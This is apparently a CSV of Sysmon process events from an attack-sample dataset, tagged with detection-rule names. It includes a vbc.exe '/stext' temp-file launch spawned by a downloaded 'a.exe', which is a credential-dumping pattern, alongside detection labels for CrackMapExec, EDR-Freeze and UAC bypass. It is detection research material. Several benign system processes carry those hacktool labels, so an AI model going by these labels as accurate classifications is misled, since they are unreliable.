CommandLine: '""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmpA185.tmp""'
FileVersion: 8.0.50727.5483
User: IEWIN7\IEUser
LogonId: '0x1336d'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\a.exe
UtcTime: 2019-06-14 22:22:32.191
"
2019-06-14T22:22:47.253995+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,1,7543,IEWIN7,"Image: C:\Windows\System32\LogonUI.exe
RuleName: ''
Description: Windows Logon User Interface Host
TerminalSessionId: 1
ParentCommandLine: winlogon.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 444
LogonGuid: 365ABB72-9C16-5D04-0000-0020E7030000
Hashes: SHA1=6FCAD4F6BB71049744D25F2B53A651AC5AA79187,MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6,IMPHASH=B8FCE86F8F679B9FC7368F8F47778678
ParentProcessGuid: 365ABB72-9C16-5D04-0000-00104B5A0000
ProcessId: 1552
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-1E37-5D04-0000-001049360B00
CommandLine: '""LogonUI.exe"" /flags:0x0'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\winlogon.exe
UtcTime: 2019-06-14 22:22:47.128
"
2019-06-14T22:22:55.441495+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,1,7546,IEWIN7,"Image: C:\Windows\System32\smss.exe
RuleName: ''
Description: Windows Session Manager
TerminalSessionId: 2
ParentCommandLine: \SystemRoot\System32\smss.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 264
LogonGuid: 365ABB72-9C16-5D04-0000-0020E7030000
Hashes: SHA1=6EBCD58670607B00DD138AB5BC22C2359A9551CE,MD5=899FAA235BD35DABE1C2505CE313AD5F,SHA256=AB17ADE22FD2E24CAC554F4FB9C84A810B8C377F09A49762F6616DA49E653141,IMPHASH=263C3FFA2FD990E9BAE492989A61AF52
ParentProcessGuid: 365ABB72-9C13-5D04-0000-0010472D0000
ProcessId: 688
CurrentDirectory: C:\Windows\
ProcessGuid: 365ABB72-1E3F-5D04-0000-0010EC890B00
CommandLine: '\SystemRoot\System32\smss.exe 00000000 00000040 '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\smss.exe
UtcTime: 2019-06-14 22:22:55.394
"
2019-06-14T22:22:55.503995+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,1,7547,IEWIN7,"Image: C:\Windows\System32\csrss.exe
RuleName: ''
Description: Client Server Runtime Process
TerminalSessionId: 2
ParentCommandLine: '\SystemRoot\System32\smss.exe 00000000 00000040 '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 688
LogonGuid: 365ABB72-9C16-5D04-0000-0020E7030000
Hashes: SHA1=53BC9B2AE89FCAD6197EC519AE588F926C88E460,MD5=342271F6142E7C70805B8A81E1BA5F5C,SHA256=F9112B88FEC5EF10A7AEDF88DCEE61956D1FCDE7CB42197216E8265578713786,IMPHASH=A801AE60E0B3E5643B92C006DA96F0E0
ParentProcessGuid: 365ABB72-1E3F-5D04-0000-0010EC890B00
ProcessId: 488
CurrentDirectory: C:\Windows\system32
ProcessGuid: 365ABB72-1E3F-5D04-0000-0010568A0B00
CommandLine: '%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\smss.exe
UtcTime: 2019-06-14 22:22:55.410
"
